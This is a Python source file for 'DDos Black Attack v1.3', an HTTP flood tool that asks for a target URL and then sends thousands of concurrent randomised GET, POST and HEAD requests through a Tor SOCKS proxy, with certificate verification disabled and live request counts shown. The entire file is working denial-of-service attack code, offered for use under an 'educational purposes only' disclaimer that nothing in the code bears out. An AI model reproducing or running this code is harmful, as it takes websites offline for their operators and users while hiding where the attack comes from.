# DDos Black Attack v1.3 (with aiohttp_socks Tor Proxy Support)
# Developer: Safwan Al-Sadaf
# Date: 2025-06-17

# ⚠️ DISCLAIMER:
# This tool is for EDUCATIONAL purposes only.
# The developer is NOT responsible for misuse.
# Made to learn ethical hacking and networking.

import asyncio
import random
import ssl
import os
from urllib.parse import quote
from aiohttp import ClientSession
from aiohttp_socks import ProxyConnector

class DDosBlackAttack:
    def __init__(self):
        self.target_url = ""
        self.host_ip = ""
        self.threads = 3000
        self.running = True
        self.methods = ['GET', 'POST', 'HEAD']
        self.proxy_url = 'socks5h://127.0.0.1:9050'
        self.ssl_ctx = self.create_ssl_context()
        self.sent_requests = 0
        self.success_requests = 0
        self.failed_requests = 0

    def create_ssl_context(self):
        ctx = ssl.create_default_context()
        ctx.set_ciphers('DEFAULT')
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def clear_screen(self):
        os.system('clear' if os.name != 'nt' else 'cls')

    def show_banner(self):
        self.clear_screen()
        print("""\033[1;92m
 ____         __                     
 / ___|  __ _ / _|_      ____ _ _ __  
 \___ \ / _` | |_\\ \ /\ / / _` | '_ \ 
  ___) | (_| |  _|\\ V  V / (_| | | | |
 |____/ \__,_|_|   \_/\_/ \__,_|_| |_|

---------------------------------------------------------------
🎯  DDos Black Attack v1.3
🎯  Developer: Safwan Al-Sadaf
🎯  Real HTTP Flooder with Tor Proxy (aiohttp_socks)
🎯  Date: 2025-06-17
🎯  Mode: Random (GET | POST | HEAD)
🎯  Proxy: socks5h://127.0.0.1:9050 ✅
---------------------------------------------------------------
"When SQLi strikes silently, databases scream without a sound."
---------------------------------------------------------------\033[0m""")

    def setup(self):
        self.show_banner()
        self.target_url = input("[+] Enter target website URL: ").strip()
        self.host_ip = input("[+] Enter target host IP address: ").strip()

    def generate_junk(self):
        return quote(f"_={random.randint(10000,999999)}&ts={random.random()}")

    def generate_headers(self):
        return {
            'User-Agent': f'DDosBlackAttack/{random.randint(100,999)}',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }

    async def http_flood(self, session, method):
        while self.running:
            try:
                async with session.request(
                    method=method,
                    url=f"{self.target_url}?{self.generate_junk()}",
                    timeout=10
                ) as response:
                    await response.read()
                    if response.status == 200:
                        self.success_requests += 1
                    else:
                        self.failed_requests += 1
            except:
                self.failed_requests += 1
            finally:
                self.sent_requests += 1

    async def stats_monitor(self):
        while self.running:
            await asyncio.sleep(1)
            print(f"\r[📡] Sent: {self.sent_requests} | ✅: {self.success_requests} | ❌: {self.failed_requests}", end='', flush=True)

    async def attack_loop(self):
        connector = ProxyConnector.from_url(self.proxy_url)
        tasks = []
        async with ClientSession(connector=connector, headers=self.generate_headers()) as session:
            for _ in range(self.threads):
                method = random.choice(self.methods)
                tasks.append(self.http_flood(session, method))
            monitor = asyncio.create_task(self.stats_monitor())
            await asyncio.gather(*tasks, return_exceptions=True)
            monitor.cancel()

    def run(self):
        self.setup()
        print("\n[✓] Attack Started! Live stats below... (Ctrl+C to stop)\n")
        try:
            asyncio.run(self.attack_loop())
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] Attack stopped by user.")
        print(f"\n[✓] Attack Complete. Total Sent: {self.sent_requests} | ✅: {self.success_requests} | ❌: {self.failed_requests}")

if __name__ == "__main__":
    tool = DDosBlackAttack()
    tool.run()